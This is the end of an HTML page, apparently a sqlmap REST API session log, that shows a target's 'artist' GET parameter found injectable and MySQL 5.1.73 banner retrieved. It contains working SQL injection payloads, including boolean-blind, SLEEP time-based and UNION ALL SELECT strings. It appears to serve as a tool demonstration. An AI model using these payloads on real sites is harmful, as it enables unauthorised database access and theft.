+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "'ORDER BY' technique appears to be usable. This should r<br/>
+educe the time needed to find the right number of query columns. Automatically e<br/>
+xtending the range for current UNION query injection technique test", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:23"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "target URL appears to have 3 columns in query", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:23"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "GET parameter 'artist' is 'Generic UNION query (NULL) - <br/>
+1 to 20 columns' injectable", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:24"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "the back-end DBMS is MySQL", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:24"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "fetching banner", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:24"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; ], <br/>
+&nbsp; &nbsp; "success": true<br/>
+}<br/>
+api (a42ddaef02e976f0)&gt; data<br/>
+[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data<br/>
+{<br/>
+&nbsp; &nbsp; "data": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "status": 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": 0, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "value": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "dbms": "MySQL", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "suffix": "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "clause": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 9<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ], <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "notes": [], <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "ptype": 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "dbms_version": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "&gt;= 5.0.12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ], <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "prefix": "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "place": "GET", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "os": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "conf": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "code": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "string": "hac", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "notString": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "titles": false, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "regexp": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "textOnly": false, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "optimize": false<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "parameter": "artist", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "data": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "1": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "comment": "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "matchRatio": 0.85, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "trueCode": 200, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "title": "AND boolean-based blind - WHERE or HAVING clause", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "templatePayload": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "vector": "AND [INFERENCE]", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "falseCode": 200, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "where": 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "payload": "artist=1 AND 2794=2794"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "5": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "comment": "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "matchRatio": 0.85, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "trueCode": 200, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "title": "MySQL &gt;= 5.0.12 AND time-based blind", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "templatePayload": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "falseCode": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "where": 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "payload": "artist=1 AND SLEEP([SLEEPTIME])"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "6": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "comment": "[GENERIC_SQL_COMMENT]", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "matchRatio": 0.85, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "trueCode": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "title": "Generic UNION query (NULL) - 1 to 20 colum<br/>
+ns", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "templatePayload": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "vector": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "[GENERIC_SQL_COMMENT]", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "NULL", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; false, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; false<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ], <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "falseCode": null, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "where": 2, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "payload": "artist=-5376 UNION ALL SELECT NULL,NULL,<br/>
+CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649<br/>
+704c68614672644a477474,0x7162717171)-- aAjy"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "status": 1, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "type": 2, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "value": "5.1.73-0ubuntu0.10.04.1"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; ], <br/>
+&nbsp; &nbsp; "success": true, <br/>
+&nbsp; &nbsp; "error": []<br/>
+}<br/>
+api (a42ddaef02e976f0)&gt; exit<br/>
+$<br/>
+<br/>
+</body></html>
